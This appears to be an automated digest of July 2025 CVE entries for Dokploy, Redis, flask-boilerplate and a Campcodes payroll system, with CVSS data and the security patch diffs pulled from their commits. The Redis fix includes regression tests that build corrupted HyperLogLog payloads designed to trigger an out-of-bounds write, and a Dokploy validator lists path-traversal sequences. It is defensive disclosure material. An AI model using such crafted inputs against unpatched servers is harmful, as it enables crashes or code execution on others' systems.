docker.getContainersByAppNameMatch interpolates the attacker-supplied appName value into a Docker CLI call without sanitisation, enabling command injection under the Dokploy service account. This vulnerability is fixed in 0.23.7.

References (2):
  1. https://github.com/Dokploy/dokploy/commit/fb5d2bd5b67322f1468e5e4d0d5abcf97517761c [Patch]
  2. https://github.com/Dokploy/dokploy/security/advisories/GHSA-m486-7pmj-8cmv [Patch, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/Dokploy/dokploy/commit/fb5d2bd5b67322f1468e5e4d0d5abcf97517761c ---
From fb5d2bd5b67322f1468e5e4d0d5abcf97517761c Mon Sep 17 00:00:00 2001
From: Mauricio Siu <47042324+Siumauricio@users.noreply.github.com>
Date: Sun, 22 Jun 2025 23:57:12 -0600
Subject: [PATCH] feat(docker-swarm): implement server authorization checks and
 input validation

- Added server authorization checks to ensure users can only access resources for their organization.
- Enhanced input validation for container and app names using regex to prevent invalid entries.
- Updated multiple query procedures in both docker and swarm routers to include these checks and validations.
---
 apps/dokploy/server/api/routers/docker.ts | 70 +++++++++++++++++++----
 apps/dokploy/server/api/routers/swarm.ts  | 37 ++++++++++--
 2 files changed, 90 insertions(+), 17 deletions(-)

diff --git a/apps/dokploy/server/api/routers/docker.ts b/apps/dokploy/server/api/routers/docker.ts
index 3de59058c..72dbb40a9 100644
--- a/apps/dokploy/server/api/routers/docker.ts
+++ b/apps/dokploy/server/api/routers/docker.ts
@@ -1,5 +1,6 @@
 import {
 	containerRestart,
+	findServerById,
 	getConfig,
 	getContainers,
 	getContainersByAppLabel,
@@ -9,6 +10,9 @@ import {
 } from "@dokploy/server";
 import { z } from "zod";
 import { createTRPCRouter, protectedProcedure } from "../trpc";
+import { TRPCError } from "@trpc/server";
+
+export const containerIdRegex = /^[a-zA-Z0-9.\-_]+$/;
 
 export const dockerRouter = createTRPCRouter({
 	getContainers: protectedProcedure
@@ -17,14 +21,23 @@ export const dockerRouter = createTRPCRouter({
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getContainers(input.serverId);
 		}),
 
 	restartContainer: protectedProcedure
 		.input(
 			z.object({
-				containerId: z.string().min(1),
+				containerId: z
+					.string()
+					.min(1)
+					.regex(containerIdRegex, "Invalid container id."),
 			}),
 		)
 		.mutation(async ({ input }) => {
@@ -34,11 +47,20 @@ export const dockerRouter = createTRPCRouter({
 	getConfig: protectedProcedure
 		.input(
 			z.object({
-				containerId: z.string().min(1),
+				containerId: z
+					.string()
+					.min(1)
+					.regex(containerIdRegex, "Invalid container id."),
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getConfig(input.containerId, input.serverId);
 		}),
 
@@ -48,11 +70,17 @@ export const dockerRouter = createTRPCRouter({
 				appType: z
 					.union([z.literal("stack"), z.literal("docker-compose")])
 					.optional(),
-				appName: z.string().min(1),
+				appName: z.string().min(1).regex(containerIdRegex, "Invalid app name."),
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getContainersByAppNameMatch(
 				input.appName,
 				input.appType,
@@ -63,12 +91,18 @@ export const dockerRouter = createTRPCRouter({
 	getContainersByAppLabel: protectedProcedure
 		.input(
 			z.object({
-				appName: z.string().min(1),
+				appName: z.string().min(1).regex(containerIdRegex, "Invalid app name."),
 				serverId: z.string().optional(),
 				type: z.enum(["standalone", "swarm"]),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getContainersByAppLabel(
 				input.appName,
 				input.type,
@@ -79,22 +113,34 @@ export const dockerRouter = createTRPCRouter({
 	getStackContainersByAppName: protectedProcedure
 		.input(
 			z.object({
-				appName: z.string().min(1),
+				appName: z.string().min(1).regex(containerIdRegex, "Invalid app name."),
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getStackContainersByAppName(input.appName, input.serverId);
 		}),
 
 	getServiceContainersByAppName: protectedProcedure
 		.input(
 			z.object({
-				appName: z.string().min(1),
+				appName: z.string().min(1).regex(containerIdRegex, "Invalid app name."),
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getServiceContainersByAppName(input.appName, input.serverId);
 		}),
 });
diff --git a/apps/dokploy/server/api/routers/swarm.ts b/apps/dokploy/server/api/routers/swarm.ts
index c5a2d4c82..735ddf96e 100644
--- a/apps/dokploy/server/api/routers/swarm.ts
+++ b/apps/dokploy/server/api/routers/swarm.ts
@@ -6,6 +6,9 @@ import {
 } from "@dokploy/server";
 import { z } from "zod";
 import { createTRPCRouter, protectedProcedure } from "../trpc";
+import { TRPCError } from "@trpc/server";
+import { findServerById } from "@dokploy/server";
+import { containerIdRegex } from "./docker";
 
 export const swarmRouter = createTRPCRouter({
 	getNodes: protectedProcedure
@@ -14,12 +17,24 @@ export const swarmRouter = createTRPCRouter({
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getSwarmNodes(input.serverId);
 		}),
 	getNodeInfo: protectedProcedure
 		.input(z.object({ nodeId: z.string(), serverId: z.string().optional() }))
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getNodeInfo(input.nodeId, input.serverId);
 		}),
 	getNodeApps: protectedProcedure
@@ -28,17 +43,29 @@ export const swarmRouter = createTRPCRouter({
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return getNodeApplications(input.serverId);
 		}),
 	getAppInfos: protectedProcedure
 		.input(
 			z.object({
-				appName: z.string(),
+				appName: z.string().min(1).regex(containerIdRegex, "Invalid app name."),
 				serverId: z.string().optional(),
 			}),
 		)
-		.query(async ({ input }) => {
+		.query(async ({ input, ctx }) => {
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
 			return await getApplicationInfo(input.appName, input.serverId);
 		}),
 });


================================================================================


CVE ID: CVE-2025-53375
Published: 2025-07-07T16:15:25.317
Modified: 2025-09-29T13:55:34.350
CVSS Score: 6.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
Dokploy is a self-hostable Platform as a Service (PaaS) that simplifies the deployment and management of applications and databases. An authenticated attacker can read any file that the Traefik process user can access (e.g., /etc/passwd, application source, environment variable files containing credentials and secrets). This may lead to full compromise of other services or lateral movement. This vulnerability is fixed in 0.23.7.

References (2):
  1. https://github.com/Dokploy/dokploy/commit/e42f6bc61050cd438726921fced64477cbf8f8e6 [Patch]
  2. https://github.com/Dokploy/dokploy/security/advisories/GHSA-vq94-qm94-mxp6 [Patch, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/Dokploy/dokploy/commit/e42f6bc61050cd438726921fced64477cbf8f8e6 ---
From e42f6bc61050cd438726921fced64477cbf8f8e6 Mon Sep 17 00:00:00 2001
From: Mauricio Siu <47042324+Siumauricio@users.noreply.github.com>
Date: Sun, 22 Jun 2025 23:57:02 -0600
Subject: [PATCH] feat(user-validation): enhance path validation in Traefik
 config

- Added refined validation for the 'path' field to prevent directory traversal attacks and unauthorized access.
- Implemented checks for null bytes and ensured paths start with the MAIN_TRAEFIK_PATH constant.
---
 apps/dokploy/server/api/routers/settings.ts |  9 +++++++
 packages/server/src/db/schema/user.ts       | 27 ++++++++++++++++++++-
 2 files changed, 35 insertions(+), 1 deletion(-)

diff --git a/apps/dokploy/server/api/routers/settings.ts b/apps/dokploy/server/api/routers/settings.ts
index 149af7046..6d091ec5b 100644
--- a/apps/dokploy/server/api/routers/settings.ts
+++ b/apps/dokploy/server/api/routers/settings.ts
@@ -459,6 +459,15 @@ export const settingsRouter = createTRPCRouter({
 					throw new TRPCError({ code: "UNAUTHORIZED" });
 				}
 			}
+
+			if (input.serverId) {
+				const server = await findServerById(input.serverId);
+
+				if (server.organizationId !== ctx.session?.activeOrganizationId) {
+					throw new TRPCError({ code: "UNAUTHORIZED" });
+				}
+			}
+
 			return readConfigInPath(input.path, input.serverId);
 		}),
 	getIp: protectedProcedure.query(async ({ ctx }) => {
diff --git a/packages/server/src/db/schema/user.ts b/packages/server/src/db/schema/user.ts
index 139daa3c8..8f4de12eb 100644
--- a/packages/server/src/db/schema/user.ts
+++ b/packages/server/src/db/schema/user.ts
@@ -15,6 +15,7 @@ import { backups } from "./backups";
 import { projects } from "./project";
 import { schedules } from "./schedule";
 import { certificateType } from "./shared";
+import { paths } from "@dokploy/server/constants";
 /**
  * This is an example of how to use the multi-project schema feature of Drizzle ORM. Use the same
  * database instance for multiple projects.
@@ -236,7 +237,31 @@ export const apiModifyTraefikConfig = z.object({
 	serverId: z.string().optional(),
 });
 export const apiReadTraefikConfig = z.object({
-	path: z.string().min(1),
+	path: z
+		.string()
+		.min(1)
+		.refine(
+			(path) => {
+				// Prevent directory traversal attacks
+				if (path.includes("../") || path.includes("..\\")) {
+					return false;
+				}
+
+				const { MAIN_TRAEFIK_PATH } = paths();
+				if (path.startsWith("/") && !path.startsWith(MAIN_TRAEFIK_PATH)) {
+					return false;
+				}
+				// Prevent null bytes and other dangerous characters
+				if (path.includes("\0") || path.includes("\x00")) {
+					return false;
+				}
+				return true;
+			},
+			{
+				message:
+					"Invalid path: path traversal or unauthorized directory access detected",
+			},
+		),
 	serverId: z.string().optional(),
 });
 


================================================================================


CVE ID: CVE-2025-53374
Published: 2025-07-07T16:15:25.113
Modified: 2025-09-29T13:53:15.480
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N

CWE Categories:
  - CWE-359: CWE-359
  - CWE-862: Missing Authorization

Description:
Dokploy is a self-hostable Platform as a Service (PaaS) that simplifies the deployment and management of applications and databases. An authenticated low-privileged account can retrieve detailed profile information about another users in the same organization by directly invoking user.one. The response discloses personally-identifiable information (PII) such as e-mail address, role, two-factor status, organization ID, and various account flags. The fix will be available in the v0.23.7.

References (2):
  1. https://github.com/Dokploy/dokploy/commit/61cf426615a4aa095b150362526aa52f2d1ea115 [Patch]
  2. https://github.com/Dokploy/dokploy/security/advisories/GHSA-fcq8-wv2q-f758 [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/Dokploy/dokploy/commit/61cf426615a4aa095b150362526aa52f2d1ea115 ---
From 61cf426615a4aa095b150362526aa52f2d1ea115 Mon Sep 17 00:00:00 2001
From: Mauricio Siu <47042324+Siumauricio@users.noreply.github.com>
Date: Sun, 22 Jun 2025 23:56:13 -0600
Subject: [PATCH] feat(user-access): implement access control for user
 information retrieval

- Added checks to deny access if the user is not found in the organization.
- Implemented authorization logic to allow access only for users requesting their own information or users with owner role in the same organization.
---
 apps/dokploy/server/api/routers/user.ts | 18 ++++++++++++++++++
 1 file changed, 18 insertions(+)

diff --git a/apps/dokploy/server/api/routers/user.ts b/apps/dokploy/server/api/routers/user.ts
index b2277399b..3ac91dc03 100644
--- a/apps/dokploy/server/api/routers/user.ts
+++ b/apps/dokploy/server/api/routers/user.ts
@@ -75,6 +75,24 @@ export const userRouter = createTRPCRouter({
 				},
 			});
 
+			// If user not found in the organization, deny access
+			if (!memberResult) {
+				throw new TRPCError({
+					code: "NOT_FOUND",
+					message: "User not found in this organization",
+				});
+			}
+
+			// Allow access if:
+			// 1. User is requesting their own information
+			// 2. User has owner role (admin permissions) AND user is in the same organization
+			if (memberResult.userId !== ctx.user.id && ctx.user.role !== "owner") {
+				throw new TRPCError({
+					code: "UNAUTHORIZED",
+					message: "You are not authorized to access this user",
+				});
+			}
+
 			return memberResult;
 		}),
 	get: protectedProcedure.query(async ({ ctx }) => {


================================================================================


CVE ID: CVE-2025-48367
Published: 2025-07-07T16:15:24.063
Modified: 2025-09-05T15:15:14.377
CVSS Score: 7.5 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-770: Allocation of Resources Without Limits or Throttling

Description:
Redis is an open source, in-memory database that persists on disk. An unauthenticated connection can cause repeated IP protocol errors, leading to client starvation and, ultimately, a denial of service. This vulnerability is fixed in 8.0.3, 7.4.5, 7.2.10, and 6.2.19.

References (6):
  1. https://github.com/redis/redis/commit/bde62951accfc4bb0a516276fd0b4b307e140ce2 [Patch]
  2. https://github.com/redis/redis/releases/tag/6.2.19 [Release Notes]
  3. https://github.com/redis/redis/releases/tag/7.2.10 [Release Notes]
  4. https://github.com/redis/redis/releases/tag/7.4.5 [Release Notes]
  5. https://github.com/redis/redis/releases/tag/8.0.3 [Release Notes]
  6. https://github.com/redis/redis/security/advisories/GHSA-4q32-c38c-pwgq [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/redis/redis/commit/bde62951accfc4bb0a516276fd0b4b307e140ce2 ---
From bde62951accfc4bb0a516276fd0b4b307e140ce2 Mon Sep 17 00:00:00 2001
From: Ozan Tezcan <ozantezcan@gmail.com>
Date: Wed, 14 May 2025 11:02:30 +0300
Subject: [PATCH] Retry accept() even if accepted connection reports an error
 (CVE-2025-48367)

In case of accept4() returns an error, we should check errno value and decide if we should retry accept4() without waiting next event loop iteration.
---
 src/anet.c           | 24 ++++++++++++++++++++++++
 src/anet.h           |  1 +
 src/cluster_legacy.c |  2 ++
 src/socket.c         |  2 ++
 src/tls.c            |  2 ++
 src/unix.c           |  2 ++
 6 files changed, 33 insertions(+)

diff --git a/src/anet.c b/src/anet.c
index ad4ac49d89a..d79434cef03 100644
--- a/src/anet.c
+++ b/src/anet.c
@@ -787,3 +787,27 @@ int anetIsFifo(char *filepath) {
     if (stat(filepath, &sb) == -1) return 0;
     return S_ISFIFO(sb.st_mode);
 }
+
+/* This function must be called after accept4() fails. It returns 1 if 'err'
+ * indicates accepted connection faced an error, and it's okay to continue
+ * accepting next connection by calling accept4() again. Other errors either
+ * indicate programming errors, e.g. calling accept() on a closed fd or indicate
+ * a resource limit has been reached, e.g. -EMFILE, open fd limit has been
+ * reached. In the latter case, caller might wait until resources are available.
+ * See accept4() documentation for details. */
+int anetAcceptFailureNeedsRetry(int err) {
+    if (err == ECONNABORTED)
+        return 1;
+
+#if defined(__linux__)
+    /* For details, see 'Error Handling' section on
+     * https://man7.org/linux/man-pages/man2/accept.2.html */
+    if (err == ENETDOWN || err == EPROTO || err == ENOPROTOOPT ||
+        err == EHOSTDOWN || err == ENONET || err == EHOSTUNREACH ||
+        err == EOPNOTSUPP || err == ENETUNREACH)
+    {
+        return 1;
+    }
+#endif
+    return 0;
+}
diff --git a/src/anet.h b/src/anet.h
index 211421940dd..1d3aec9cdf5 100644
--- a/src/anet.h
+++ b/src/anet.h
@@ -53,5 +53,6 @@ int anetPipe(int fds[2], int read_flags, int write_flags);
 int anetSetSockMarkId(char *err, int fd, uint32_t id);
 int anetGetError(int fd);
 int anetIsFifo(char *filepath);
+int anetAcceptFailureNeedsRetry(int err);
 
 #endif
diff --git a/src/cluster_legacy.c b/src/cluster_legacy.c
index 88dc9969190..6f1635e9e5d 100644
--- a/src/cluster_legacy.c
+++ b/src/cluster_legacy.c
@@ -1253,6 +1253,8 @@ void clusterAcceptHandler(aeEventLoop *el, int fd, void *privdata, int mask) {
     while(max--) {
         cfd = anetTcpAccept(server.neterr, fd, cip, sizeof(cip), &cport);
         if (cfd == ANET_ERR) {
+            if (anetAcceptFailureNeedsRetry(errno))
+                continue;
             if (errno != EWOULDBLOCK)
                 serverLog(LL_VERBOSE,
                     "Error accepting cluster node: %s", server.neterr);
diff --git a/src/socket.c b/src/socket.c
index 241a541080d..226b414f85e 100644
--- a/src/socket.c
+++ b/src/socket.c
@@ -308,6 +308,8 @@ static void connSocketAcceptHandler(aeEventLoop *el, int fd, void *privdata, int
     while(max--) {
         cfd = anetTcpAccept(server.neterr, fd, cip, sizeof(cip), &cport);
         if (cfd == ANET_ERR) {
+            if (anetAcceptFailureNeedsRetry(errno))
+                continue;
             if (errno != EWOULDBLOCK)
                 serverLog(LL_WARNING,
                     "Accepting client connection: %s", server.neterr);
diff --git a/src/tls.c b/src/tls.c
index 65526c04f7d..a0733a4b636 100644
--- a/src/tls.c
+++ b/src/tls.c
@@ -771,6 +771,8 @@ static void tlsAcceptHandler(aeEventLoop *el, int fd, void *privdata, int mask)
     while(max--) {
         cfd = anetTcpAccept(server.neterr, fd, cip, sizeof(cip), &cport);
         if (cfd == ANET_ERR) {
+            if (anetAcceptFailureNeedsRetry(errno))
+                continue;
             if (errno != EWOULDBLOCK)
                 serverLog(LL_WARNING,
                     "Accepting client connection: %s", server.neterr);
diff --git a/src/unix.c b/src/unix.c
index b61cb6d4959..e26f0d27ad1 100644
--- a/src/unix.c
+++ b/src/unix.c
@@ -102,6 +102,8 @@ static void connUnixAcceptHandler(aeEventLoop *el, int fd, void *privdata, int m
     while(max--) {
         cfd = anetUnixAccept(server.neterr, fd);
         if (cfd == ANET_ERR) {
+            if (anetAcceptFailureNeedsRetry(errno))
+                continue;
             if (errno != EWOULDBLOCK)
                 serverLog(LL_WARNING,
                     "Accepting client connection: %s", server.neterr);


================================================================================


CVE ID: CVE-2025-43931
Published: 2025-07-07T16:15:23.250
Modified: 2025-07-08T18:15:28.290
CVSS Score: 9.8 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-640: CWE-640

Description:
flask-boilerplate through a170e7c allows account takeover via the password reset feature because SERVER_NAME is not configured and thus a reset depends on the Host HTTP header.

References (2):
  1. https://gist.github.com/BrookeYangRui/19fcc6c19df7bb4d8437476c609a6129
  2. https://github.com/MaxHalford/flask-boilerplate/blob/a170e7cec605906801680567c4279b30ccd9630b/app/views/user.py#L103-L126

Attempting to extract code examples from references...

--- Code from https://gist.github.com/BrookeYangRui/19fcc6c19df7bb4d8437476c609a6129 ---
SERVER_NAME

url_for(..., _external=True)

Host

================================================================================


CVE ID: CVE-2025-32023
Published: 2025-07-07T16:15:22.830
Modified: 2025-09-05T15:16:30.927
CVSS Score: 7.0 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

CWE Categories:
  - CWE-680: CWE-680

Description:
Redis is an open source, in-memory database that persists on disk. From 2.8 to before 8.0.3, 7.4.5, 7.2.10, and 6.2.19, an authenticated user may use a specially crafted string to trigger a stack/heap out of bounds write on hyperloglog operations, potentially leading to remote code execution. The bug likely affects all Redis versions with hyperloglog operations implemented. This vulnerability is fixed in 8.0.3, 7.4.5, 7.2.10, and 6.2.19. An additional workaround to mitigate the problem without patching the redis-server executable is to prevent users from executing hyperloglog operations. This can be done using ACL to restrict HLL commands.

References (6):
  1. https://github.com/redis/redis/commit/50188747cbfe43528d2719399a2a3c9599169445 [Patch]
  2. https://github.com/redis/redis/releases/tag/6.2.19 [Release Notes]
  3. https://github.com/redis/redis/releases/tag/7.2.10 [Release Notes]
  4. https://github.com/redis/redis/releases/tag/7.4.5 [Release Notes]
  5. https://github.com/redis/redis/releases/tag/8.0.3 [Release Notes]
  6. https://github.com/redis/redis/security/advisories/GHSA-rp2m-q4j6-gr43 [Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/redis/redis/commit/50188747cbfe43528d2719399a2a3c9599169445 ---
From 50188747cbfe43528d2719399a2a3c9599169445 Mon Sep 17 00:00:00 2001
From: "debing.sun" <debing.sun@redis.com>
Date: Wed, 7 May 2025 18:25:06 +0800
Subject: [PATCH] Fix out of bounds write in hyperloglog commands
 (CVE-2025-32023)

Co-authored-by: oranagra <oran@redislabs.com>
---
 src/hyperloglog.c          | 47 +++++++++++++++++++++++++++++++----
 tests/unit/hyperloglog.tcl | 51 ++++++++++++++++++++++++++++++++++++++
 2 files changed, 93 insertions(+), 5 deletions(-)

diff --git a/src/hyperloglog.c b/src/hyperloglog.c
index 2f8c02e2cf2..d6a87822d19 100644
--- a/src/hyperloglog.c
+++ b/src/hyperloglog.c
@@ -579,6 +579,7 @@ int hllSparseToDense(robj *o) {
     struct hllhdr *hdr, *oldhdr = (struct hllhdr*)sparse;
     int idx = 0, runlen, regval;
     uint8_t *p = (uint8_t*)sparse, *end = p+sdslen(sparse);
+    int valid = 1;
 
     /* If the representation is already the right one return ASAP. */
     hdr = (struct hllhdr*) sparse;
@@ -598,16 +599,27 @@ int hllSparseToDense(robj *o) {
     while(p < end) {
         if (HLL_SPARSE_IS_ZERO(p)) {
             runlen = HLL_SPARSE_ZERO_LEN(p);
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             idx += runlen;
             p++;
         } else if (HLL_SPARSE_IS_XZERO(p)) {
             runlen = HLL_SPARSE_XZERO_LEN(p);
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             idx += runlen;
             p += 2;
         } else {
             runlen = HLL_SPARSE_VAL_LEN(p);
             regval = HLL_SPARSE_VAL_VALUE(p);
-            if ((runlen + idx) > HLL_REGISTERS) break; /* Overflow. */
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             while(runlen--) {
                 HLL_DENSE_SET_REGISTER(hdr->registers,idx,regval);
                 idx++;
@@ -618,7 +630,7 @@ int hllSparseToDense(robj *o) {
 
     /* If the sparse representation was valid, we expect to find idx
      * set to HLL_REGISTERS. */
-    if (idx != HLL_REGISTERS) {
+    if (!valid || idx != HLL_REGISTERS) {
         sdsfree(dense);
         return C_ERR;
     }
@@ -915,27 +927,40 @@ int hllSparseAdd(robj *o, unsigned char *ele, size_t elesize) {
 void hllSparseRegHisto(uint8_t *sparse, int sparselen, int *invalid, int* reghisto) {
     int idx = 0, runlen, regval;
     uint8_t *end = sparse+sparselen, *p = sparse;
+    int valid = 1;
 
     while(p < end) {
         if (HLL_SPARSE_IS_ZERO(p)) {
             runlen = HLL_SPARSE_ZERO_LEN(p);
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             idx += runlen;
             reghisto[0] += runlen;
             p++;
         } else if (HLL_SPARSE_IS_XZERO(p)) {
             runlen = HLL_SPARSE_XZERO_LEN(p);
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             idx += runlen;
             reghisto[0] += runlen;
             p += 2;
         } else {
             runlen = HLL_SPARSE_VAL_LEN(p);
             regval = HLL_SPARSE_VAL_VALUE(p);
+            if ((runlen + idx) > HLL_REGISTERS) { /* Overflow. */
+                valid = 0;
+                break;
+            }
             idx += runlen;
             reghisto[regval] += runlen;
             p++;
         }
     }
-    if (idx != HLL_REGISTERS && invalid) *invalid = 1;
+    if ((!valid || idx != HLL_REGISTERS) && invalid) *invalid = 1;
 }
 
 /* ========================= HyperLogLog Count ==============================
@@ -1204,22 +1229,34 @@ int hllMerge(uint8_t *max, robj *hll) {
     } else {
         uint8_t *p = hll->ptr, *end = p + sdslen(hll->ptr);
         long runlen, regval;
+        int valid = 1;
 
         p += HLL_HDR_SIZE;
         i = 0;
         while(p < end) {
             if (HLL_SPARSE_IS_ZERO(p)) {
                 runlen = HLL_SPARSE_ZERO_LEN(p);
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 i += runlen;
                 p++;
             } else if (HLL_SPARSE_IS_XZERO(p)) {
                 runlen = HLL_SPARSE_XZERO_LEN(p);
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 i += runlen;
                 p += 2;
             } else {
                 runlen = HLL_SPARSE_VAL_LEN(p);
                 regval = HLL_SPARSE_VAL_VALUE(p);
-                if ((runlen + i) > HLL_REGISTERS) break; /* Overflow. */
+                if ((runlen + i) > HLL_REGISTERS) { /* Overflow. */
+                    valid = 0;
+                    break;
+                }
                 while(runlen--) {
                     if (regval > max[i]) max[i] = regval;
                     i++;
@@ -1227,7 +1264,7 @@ int hllMerge(uint8_t *max, robj *hll) {
                 p++;
             }
         }
-        if (i != HLL_REGISTERS) return C_ERR;
+        if (!valid || i != HLL_REGISTERS) return C_ERR;
     }
     return C_OK;
 }
diff --git a/tests/unit/hyperloglog.tcl b/tests/unit/hyperloglog.tcl
index f1bbeace9d1..76c0a8d8d2c 100644
--- a/tests/unit/hyperloglog.tcl
+++ b/tests/unit/hyperloglog.tcl
@@ -137,6 +137,57 @@ start_server {tags {"hll"}} {
         set e
     } {*WRONGTYPE*}
 
+    test {Corrupted sparse HyperLogLogs doesn't cause overflow and out-of-bounds with XZERO opcode} {
+        r del hll
+        
+        # Create a sparse-encoded HyperLogLog header
+        set pl [string cat "HYLL" [binary format c12 {1 0 0 0 0 0 0 0 0 0 0 0}]]
+
+        # Create an XZERO opcode with the maximum run length of 16384(2^14)
+        set runlen [expr 16384 - 1]
+        set chunk [binary format cc [expr {0b01000000 | ($runlen >> 8)}] [expr {$runlen & 0xff}]]
+        # Fill the HLL with more than 131072(2^17) XZERO opcodes to make the total
+        # run length exceed 4GB, will cause an integer overflow.
+        set repeat [expr 131072 + 1000]
+        for {set i 0} {$i < $repeat} {incr i} {
+            append pl $chunk
+        }
+
+        # Create a VAL opcode with a value that will cause out-of-bounds.
+        append pl [binary format c 0b11111111]
+        r set hll $pl
+
+        # This should not overflow and out-of-bounds.
+        assert_error {*INVALIDOBJ*} {r pfcount hll hll}
+        assert_error {*INVALIDOBJ*} {r pfdebug getreg hll}
+        r ping
+    }
+
+    test {Corrupted sparse HyperLogLogs doesn't cause overflow and out-of-bounds with ZERO opcode} {
+        r del hll
+        
+        # Create a sparse-encoded HyperLogLog header
+        set pl [string cat "HYLL" [binary format c12 {1 0 0 0 0 0 0 0 0 0 0 0}]]
+
+        # # Create an ZERO opcode with the maximum run length of 64(2^6)
+        set chunk [binary format c [expr {0b00000000 | 0x3f}]]
+        # Fill the HLL with more than 33554432(2^17) ZERO opcodes to make the total
+        # run length exceed 4GB, will cause an integer overflow.
+        set repeat [expr 33554432 + 1000]
+        for {set i 0} {$i < $repeat} {incr i} {
+            append pl $chunk
+        }
+
+        # Create a VAL opcode with a value that will cause out-of-bounds.
+        append pl [binary format c 0b11111111]
+        r set hll $pl
+
+        # This should not overflow and out-of-bounds.
+        assert_error {*INVALIDOBJ*} {r pfcount hll hll}
+        assert_error {*INVALIDOBJ*} {r pfdebug getreg hll}
+        r ping
+    }
+
     test {Corrupted dense HyperLogLogs are detected: Wrong length} {
         r del hll
         r pfadd hll a b c


================================================================================


CVE ID: CVE-2025-7132
Published: 2025-07-07T15:15:32.937
Modified: 2025-07-08T18:15:38.643
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Payroll Management System 1.0. It has been rated as critical. Affected by this issue is some unknown functionality of the file /ajax.php?action=save_payroll. The manipulation of the argument ID leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/wyl091256/CVE/issues/20 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315044 [Permissions Required]
  3. https://vuldb.com/?id.315044 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605950 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

